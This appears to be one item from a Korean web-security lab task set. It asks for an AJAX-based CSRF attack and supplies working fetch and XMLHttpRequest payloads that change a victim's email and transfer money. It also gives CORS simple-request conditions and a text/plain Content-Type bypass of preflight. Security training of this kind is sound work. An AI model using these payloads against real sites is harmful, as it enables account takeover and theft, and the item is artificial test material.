- order: 4
  instruction: |-
    AJAX 기반 CSRF를 작성하시오: fetch API 활용.

    ■ 실습 방법

    ▶ 1단계: fetch API CSRF (현대 변형)
    ```html
    <script>
    // credentials:include = 쿠키 자동 첨부
    fetch('http://10.20.30.80/profile', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'evil@attacker.com'})
    }).then(r => console.log(r.status));
    </script>
    ```
    **단, CORS 제약**: 응답을 *읽으려면* `Access-Control-Allow-Origin` 필요. 그러나 *요청 자체*는 차단되지 않음 → 쓰기 작업 (POST/DELETE) 은 그대로 위험.

    ▶ 2단계: XMLHttpRequest 변형 (legacy 호환)
    ```javascript
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://victim/api/transfer', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('to=evil&amount=1000');
    ```

    ▶ 3단계: 도구 A — Burp Suite + 동적 PoC
    1. fetch 요청 캡처 → Burp Repeater 로 검증
    2. **Generate CSRF PoC** → preflight 가 발생하지 않는 simple request 인지 자동 판단

    ▶ 4단계: CORS Simple Request 조건 (preflight 없이 통과)
    | 조건 | 값 |
    |---|---|
    | Method | GET / HEAD / POST |
    | Headers | Accept / Accept-Language / Content-Language / Content-Type |
    | Content-Type | text/plain / multipart/form-data / application/x-www-form-urlencoded **만** |

    `application/json` 은 preflight 발생 → CSRF 차단. 그러나 일부 API 가 `text/plain` 도 받으면 우회 가능.

    ▶ 5단계: 우회 — Content-Type 변경
    ```javascript
    fetch('http://victim/api/json-endpoint', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'text/plain'},  // simple request → preflight 없음
      body: '{"email":"evil"}'  // 서버가 text/plain 도 JSON parse 한다면 통과
    });
    ```

    ▶ 6단계: 답변
    fetch PoC + simple request 조건 + 방어 (CORS Allow-Origin 명시 / 토큰 검증) 1 문장.
